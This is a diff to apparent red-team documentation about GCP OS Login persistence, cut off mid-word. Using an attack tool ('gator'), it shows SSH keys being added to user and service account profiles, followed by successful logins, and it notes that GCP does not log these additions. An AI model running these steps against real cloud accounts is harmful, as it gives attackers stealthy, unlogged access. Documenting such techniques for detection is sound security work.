@@ -493,3 +493,75 @@ GCP doesn't log system-level changes or modifications like adding a Public SSH K
 One way to detect any Persistence in case of OS Login is to check the part where the Persistance vector is being added, in this case it's the Cloud User / Service Account profile. While GCP does log instances of users logging into a Instances when OS Login is enabled, it does not log the addition of SSH Public Keys to a Cloud User or Service Account profile. 
 
 This lack of logging creates a blind spot for defenders, making it difficult to track who has added an SSH key and potentially leaving the door open for unauthorized access. For attackers, this is a significant advantage, as they can add their SSH keys without triggering any alerts or logs, thereby gaining a stealthy pathway into the system. This is a considerable chokepoint for defenders and something that organizations should be aware of when configuring their GCP security settings.
+
+Adding Public SSH Key to User Account Profile
+```bash
+$ gator compute instances add-ssh-key --project-id coastal-height-389305 --email admin@glaciersprings.net --instance-name instance-1 --zone us-central1-a
+[INFO]    OS Login is Enabled at Project Level.
+[INFO]    OS Login is Not Set at Instance Level.
+[INFO]    Project-wide SSH keys are OFF.
+[SUCCESS] SSH key added to OS Login for user admin@glaciersprings.net.
+[INFO]    Private and Public Key has been saved in "C:\Users\Administrator\.gator", use it to access instance-1.
+[INFO]    Usage: ssh -i "C:\Users\Administrator\.gator\private_key.pem" admin_glaciersprings_net@35.184.36.228
+
+$ ssh -i "C:\Users\Administrator\.gator\private_key.pem" admin_glaciersprings_net@35.184.36.228
+Linux instance-1 5.10.0-24-cloud-amd64 #1 SMP Debian 5.10.179-5 (2023-08-08) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Thu Aug 31 09:09:55 2023 from 152.58.4.168
+admin_glaciersprings_net@instance-1:~$
+```
+
+Adding Public SSH Key to Service Account Profile
+```bash
+$ gator compute instances add-ssh-key --project-id coastal-height-389305 --email gworkspace@coastal-height-389305.iam.gserviceaccount.com --instance-name instance-1 --zone us-central1-a
+[INFO]    OS Login is Enabled at Project Level.
+[INFO]    OS Login is Not Set at Instance Level.
+[INFO]    Project-wide SSH keys are OFF.
+[SUCCESS] SSH key added to OS Login for user gworkspace@coastal-height-389305.iam.gserviceaccount.com.
+[INFO]    Private and Public Key has been saved in "C:\Users\Administrator\.gator", use it to access instance-1.
+[INFO]    Usage: ssh -i "C:\Users\Administrator\.gator\private_key.pem" sa_104606308555929542404@35.184.36.228
+
+$  ssh -i "C:\Users\Administrator\.gator\private_key.pem" sa_104606308555929542404@35.184.36.228
+Linux instance-1 5.10.0-24-cloud-amd64 #1 SMP Debian 5.10.179-5 (2023-08-08) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Sat Aug 26 06:28:35 2023 from 49.37.106.156
+sa_104606308555929542404@instance-1:~$
+```
+
+OS Login Enabled at Project Level but set to False or Disabled at Instance Level
+
+```bash
+$ gator compute instances add-ssh-key --project-id coastal-height-389305 --email admin@glaciersprings.net --instance-name instance-1 --zone us-central1-a
+[INFO]    OS Login is Enabled at Project Level.
+[INFO]    OS Login is Disabled at Instance Level.
+[INFO]    Project-wide SSH keys are OFF.
+[SUCCESS] Adding SSH public key to both Project and Instance Level.
+[INFO]    Private and Public Key has been saved in "C:\Users\Administrator\.gator", use it to access instance-1.
+[INFO]    Usage: ssh -i "C:\Users\Administrator\.gator\private_key.pem" admin@35.184.36.228
+
+$ ssh -i "C:\Users\Administrator\.gator\private_key.pem" admin@35.184.36.228
+Linux instance-1 5.10.0-24-cloud-amd64 #1 SMP Debian 5.10.179-5 (2023-08-08) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Sat Aug 26 06:51:27 2023 from 49.37.106.156
+admin@instance-1:~$
+```
+
+Projec
